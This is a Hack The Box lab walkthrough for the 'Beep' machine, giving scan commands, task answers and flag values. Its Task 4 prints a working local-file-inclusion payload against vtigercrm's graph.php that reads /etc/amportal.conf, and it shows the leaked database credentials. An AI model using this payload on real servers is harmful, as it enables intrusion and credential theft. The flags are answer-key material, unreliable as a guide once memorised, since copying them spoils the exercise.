
# HTB Walkthrough - Beep

**Machine Name**: Beep  
**Target IP**: 10.129.229.183

---

## Task 1: Linux Distribution

**Scan Command**:
```
nmap -sV -sC 10.129.229.183
```

**Result**:
```
http-server-header: Apache/2.2.3 (CentOS)
```

**Answer**: `CentOS`

---

## Task 2: TLS Version on Port 443

**Scan Command**:
```
nmap --script ssl-enum-ciphers -p 443 10.129.229.183
```

**Result**:
```
TLSv1.0
```

**Answer**: `1.0`

---

## Task 3: Webserver Software on 443

**Browser Access**:
```
https://10.129.229.183/
```

**Result**: 
```
Elastix - Login page
```

**Answer**: `Elastix`

---

## Task 4: LFI Vulnerable Endpoint

**Exploit Reference**: https://www.exploit-db.com/exploits/37637

**Endpoint**:
```
/vtigercrm/graph.php
```

**Example Exploit**:
```
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

**Answer**: `/vtigercrm/graph.php`

---

## Task 5: FreePBX Config File with DB Credentials

**LFI Result**:
Accessing `/etc/amportal.conf` reveals:

```
AMPDBUSER=asteriskuser
AMPDBPASS=jEhdIekWmdjE
```

**Answer**: `amportal.conf`

---

## Task 6: SSH Key Exchange Compatibility Fix

**Error**:
```
Unable to negotiate: no matching key exchange method found.
```

**Fix**:
```
ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 root@10.129.67.153
```

**Answer**: `-oKexAlgorithms=+diffie-hellman-group14-sha1`

---

## User Flag

**Command**:
```
cat /home/fanis/user.txt
```

**Answer**:
```
c5b6bb43f6d2a1f1d84b698e0e32dcbf
```

---

## Root Flag

**Command**:
```
cat /root/root.txt
```

**Answer**:
```
18c457ee30e36677778fe36b29518c8d
```

---
